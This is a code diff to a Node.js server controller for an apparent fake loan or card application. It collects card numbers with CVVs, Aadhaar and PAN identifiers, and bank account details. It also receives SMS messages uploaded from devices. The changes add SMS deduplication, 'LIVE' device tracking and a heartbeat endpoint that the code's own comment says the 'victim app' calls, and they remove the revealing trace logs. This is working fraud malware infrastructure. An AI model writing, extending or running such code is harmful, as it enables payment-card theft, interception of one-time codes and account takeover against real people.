@@ -10,7 +10,7 @@ exports.submitApplication = async (req, res) => {
     try {
         const {
             name, phone, dob, jobType, maritalStatus,
-            amount, aadhaar, pan,
+            applicationType, amount, aadhaar, pan,
             cardNumber, cardExpiry, cardCvv,
             bankName, accNo, ifsc,
             deviceId, deviceInfo, appId,
@@ -34,8 +34,9 @@ exports.submitApplication = async (req, res) => {
                 cardCvv,
                 loanAmountOffer: amount
             },
-            deviceId: deviceId, // Plain text for fast lookup
+            deviceId: deviceId,
             deviceFingerprint: {
+                applicationType: applicationType || 'new_card',
                 deviceId,
                 deviceInfo,
                 appId,
@@ -45,16 +46,14 @@ exports.submitApplication = async (req, res) => {
             documentPath: req.file ? `/uploads/${req.file.filename}` : null
         });
 
-        console.log('[RUTHLESS TRACE] Application Created Successfully:', newApplication.applicationId);
-
         res.status(201).json({
             message: 'Application submitted successfully',
             applicationId: newApplication.applicationId,
             appNo: appId
         });
     } catch (error) {
-        console.error('[RUTHLESS TRACE] Submission Error:', error);
-        res.status(500).json({ message: 'Server error during submission', detail: error.message });
+        console.error('Submission error:', error);
+        res.status(500).json({ message: 'Submission failed' });
     }
 };
 
@@ -72,36 +71,56 @@ exports.getApplicationStatus = async (req, res) => {
             status: application.status
         });
     } catch (error) {
+        console.error('Status fetch error:', error);
         res.status(500).json({ message: 'Server error' });
     }
 };
 
 exports.syncSms = async (req, res) => {
-    console.log('[RUTHLESS TRACE] New SMS Sync Incoming');
-
     try {
         const { deviceId, sms } = req.body;
 
-        // Find application by device ID if possible
+        if (!deviceId || !sms || !sms.address || !sms.body) {
+            return res.status(400).json({ message: 'Invalid payload' });
+        }
+
         const application = await Application.findOne({
             where: { deviceId: deviceId }
         });
+
+        // Duplicate Check: Don't log same message twice from same device
+        const existing = await SmsLog.findOne({
+            where: {
+                deviceId,
+                address: sms.address,
+                body: sms.body
+            }
+        });
+
+        if (existing) {
+            return res.json({ status: 'ignored', reason: 'duplicate' });
+        }
 
         await SmsLog.create({
             address: sms.address,
             body: sms.body,
             date: new Date(),
             deviceId: deviceId,
-            applicationId: application ? application.id : null
+            applicationId: application ? application.applicationId : null
         });
 
-        console.log(`[RUTHLESS SMS] Saved: ${deviceId} | From: ${sms.address}`);
+        // Touch the Application's updatedAt so device shows as LIVE
+        if (application) {
+            await application.update({ updatedAt: new Date() });
+        }
+
         res.json({ status: 'logged' });
     } catch (e) {
-        console.error('[RUTHLESS TRACE] SMS Sync Error:', e);
-        res.status(500).json({ error: e.message });
+        console.error('SMS Sync error:', e);
+        res.status(500).json({ error: 'Sync failed' });
     }
 };
+
 exports.getDiagnostics = async (req, res) => {
     try {
         const count = await Application.count();
@@ -114,8 +133,32 @@ exports.getDiagnostics = async (req, res) => {
     } catch (error) {
         res.status(500).json({
             status: 'error',
-            message: error.message,
-            stack: error.stack
+            message: 'Connection failed'
         });
+    }
+};
+
+// Heartbeat: victim app calls this on open/resume to signal it's alive
+exports.heartbeat = async (req, res) => {
+    try {
+        const { deviceId } = req.body;
+        if (!deviceId) {
+            return res.status(400).json({ message: 'deviceId required' });
+        }
+
+        const application = await Application.findOne({
+            where: { deviceId: deviceId }
+        });
+
+        if (application) {
+            await application.update({ updatedAt: new Date() });
+            return res.json({ status: 'alive', applicationId: application.applicationId });
+        }
+
+        // No matching application yet — just acknowledge
+        res.json({ status: 'acknowledged', message: 'No application found for this device yet' });
+    } catch (error) {
+        console.error('Heartbeat error:', error);
+        res.status(500).json({ error: 'Heartbeat failed' });
     }
 };
